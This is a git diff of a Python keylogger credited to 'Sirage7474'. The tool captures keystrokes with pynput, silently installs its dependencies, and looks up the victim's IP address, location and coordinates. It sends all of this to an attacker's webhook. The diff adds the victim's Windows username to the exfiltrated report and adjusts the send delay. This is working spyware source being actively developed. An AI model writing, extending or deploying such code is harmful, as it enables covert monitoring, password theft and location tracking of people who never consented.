@@ -1,5 +1,5 @@
-# Made By Sirage7474
-# I am not responisble for any damages
+# v1 Made By Sirage7474
+# I am not responsible for any damages
 
 webhook_url = "YOUR_WEBHOOK_TOKEN"
 
@@ -25,6 +25,7 @@ country_phone_codes = {
     "VN": "+84", "ZA": "+27"
 }
 
+
 try:
     os.system("pip install pynput requests")
 except:
@@ -43,6 +44,9 @@ modifier_keys = {
     keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r,
 }
 
+def get_windows_username():
+    return os.getenv('USERNAME') or "UnknownUser"
+
 def send_ip_info():
     try:
         ip_info = requests.get("https://ipinfo.io/json").json()
@@ -51,9 +55,11 @@ def send_ip_info():
         country = ip_info.get("country", "Unknown")
         loc = ip_info.get("loc", "N/A")
         phone_code = country_phone_codes.get(country, "Unknown")
+        user_name = get_windows_username()
 
         message = (
             "**User Is Connected!**\n\n"
+            f"👤 **Windows User:** `{user_name}`\n"
             f"🌐 **IP:** `{ip}`\n"
             f"🏙️ **Location:** `{city}, {country}`\n"
             f"📍 **Coordinates:** `{loc}`\n"
@@ -88,7 +94,7 @@ def schedule_send():
     global send_timer
     if send_timer and send_timer.is_alive():
         send_timer.cancel()
-    send_timer = threading.Timer(1.5, send_data)  # 1.5 sec wait time
+    send_timer = threading.Timer(2.0, send_data) 
     send_timer.start()
 
 def format_key(key):
